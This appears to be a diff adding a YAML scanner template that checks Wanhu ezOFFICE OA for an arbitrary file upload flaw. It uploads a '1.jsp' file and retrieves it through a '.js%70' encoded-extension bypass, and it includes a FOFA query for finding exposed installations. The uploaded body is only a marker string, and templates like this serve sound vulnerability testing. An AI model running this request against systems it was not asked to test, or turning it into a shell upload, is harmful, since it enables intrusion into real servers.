@@ -1,0 +1,37 @@
+id: poc-yaml-wanhu-ezoffice-fileupload-controller-upload
+info:
+  name: 万户OA-ezOFFICE fileUpload.controller 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+requests:
+- method: POST
+  path: /defaultroot/upload/fileUpload.controller
+  headers:
+    Content-Type: multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
+  data: '--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
+
+    Content-Disposition: form-data; name="file"; filename="1.jsp"
+
+    Content-Type: application/octet-stream
+
+    Content-Transfer-Encoding: binary
+
+
+    This website has a vulnerability
+
+    --KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--
+
+    '
+  output:
+  - regex_match(body,`"data":"(?P<filename>.*?).jsp`)
+  expression: "status_code == 200 && \ncontains(body,\"\\\"success\\\"\")\n"
+- method: GET
+  path: /defaultroot/upload/html/{{.filename}}.js%70
+  expression: "status_code == 200 && \nbody == \"This website has a vulnerability\"\
+    \n"
+variables: {}
+transport: http
